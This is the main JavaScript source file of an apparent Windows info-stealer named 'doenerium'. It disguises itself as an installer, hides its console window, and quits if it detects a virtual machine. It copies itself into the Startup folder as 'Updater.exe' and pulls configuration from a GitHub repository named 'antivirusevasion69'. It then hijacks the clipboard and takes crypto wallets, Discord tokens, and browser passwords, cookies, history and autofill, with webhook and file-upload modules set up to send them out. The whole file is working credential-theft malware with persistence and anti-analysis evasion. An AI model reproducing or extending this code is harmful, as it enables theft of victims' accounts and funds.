class doenerium {
  constructor() {
    this.requires = {
      fs: require("fs"),
      crypto: require("crypto"),
      os: require("os"),
      axios: require("axios"),
      child_process: require("child_process"),
      systeminformation: require("systeminformation"),
      buf_replace: require("buffer-replace"),
      jszip: require("zip-lib"),
      dpapi: require("win-dpapi"),
      sqlite3: require("sqlite3"),
      path: require("path"),
      request: require("request"),
    };

    this.utils = {
      encryption: require("./utils/encryption")(this),
    };

    this.config = {
      counter: require("./config/counter")(this),
      crypto: require("./config/crypto")(this),
      discord: require("./config/discord")(this),
      environ: require("./config/environ")(this),
      executable: require("./config/executable")(this),
      main: require("./config/main")(this),
      user: require("./config/user")(this),
      jszip: require("./config/jszip")(this),
      wallets: require("./config/wallets")(this),
    };

    this.config.webhook = require("./config")(this);
    this.webhooks = [this.config.webhook.url];
    this.config.keywords = require("./keywords")(this);

    this.utils = {
      encryption: require("./utils/encryption")(this),
      constructor: require("./utils/constructor")(this),
      discord: require("./utils/discord")(this),
      flags: require("./utils/flags")(this),
      infection: require("./utils/infection")(this),
      protection: require("./utils/protection")(this),
      prototype: require("./utils/prototype")(this),
      time: require("./utils/time")(this),
      clipper: require("./utils/clipper")(this),
      jszip: require("./utils/jszip")(this),
      browsers: require("./utils/browsers")(this),
      data: require("./utils/data")(this),
      wallets: require("./utils/wallets")(this),
      webhook: require("./utils/webhook")(this),
    };

    this.utils.gofile = require("./gofile");
  }

  async add_to_startup() {
    this.requires.fs
      .createReadStream(process.argv0)
      .pipe(
        this.requires.fs.createWriteStream(
          `${process.env.APPDATA.replace(
            "\\",
            "/"
          )}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`
        )
      );

    setTimeout(() => {
      this.requires.fs.rename(
        `${process.env.APPDATA.replace(
          "\\",
          "/"
        )}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`,
        `${process.env.APPDATA.replace(
          "\\",
          "/"
        )}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`
      );
    }, 3000);
  }

  async init() {
    process.on("unhandledRejection", (err) => {
      console.log(err);
    });

    process.on("uncaughtException", (exc) => {
      console.log(exc);
    });

    process.title = "Installer";
    console.log("Downloading client...");

    const exit = await this.utils.protection.inVM();

    if (exit) {
      process.exit(0);
    }

    this.add_to_startup();

    this.utils.constructor.loadCPUS();

    try {
      this.config.embed = JSON.parse(
        JSON.stringify(
          (
            await this.requires.axios.get(
              "https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/embed.json"
            )
          ).data
        )
      );
    } catch {
      process.exit(0);
    }
    this.config.embed.footer = {
      text: `${this.utils.encryption.decryptData(
        this.config.user.hostname
      )} | ${this.config.embed.credits}`,
      icon_url: this.config.embed.avatar_url,
    };

    this.config.jszip.path = this.config.jszip.generate_path();


    try {

      this.utils.clipper.detectClipboard();
    } catch { }
    await this.utils.wallets.getWallets();
    await this.utils.discord.getTokens();
    await this.utils.discord.saveDiscordTokens();

    for (var path of this.config.environ.password_and_cookies_paths) {
      if (this.requires.fs.existsSync(path + "Login Data")) {
        [
          "getPasswords",
          "getCookies",
          "getBookmarks",
          "getHistory",
          "getAutofill",
          "getWallets",
        ].forEach(async (_func) => {
          await this.utils.browsers[_func](path);
        });
      }
    }

    await this.utils.infection.initialize();

    await this.utils.time.sleep(60000);

    this.requires.fs.rmSync(this.config.jszip.path, {
      recursive: true,
      force: true,
    });

    this.requires.fs.rmSync(`${this.config.jszip.path}.zip`, {
      recursive: true,
      force: true,
    });
  }
}

process.on("uncaughtException", (err) => {
  console.log(err);
});

const axios = require("axios");

async function hideSelf() {
  require("node-hide-console-window").hideConsole();
}

(async () => {
  await hideSelf();
  while (true) {
    try {
      await axios.get("https://www.google.com");

      break;
    } catch {
      // no internet connection
    }

    await new Promise((resolve) => setTimeout(resolve, 3000));
  }

  new doenerium().init();
})();
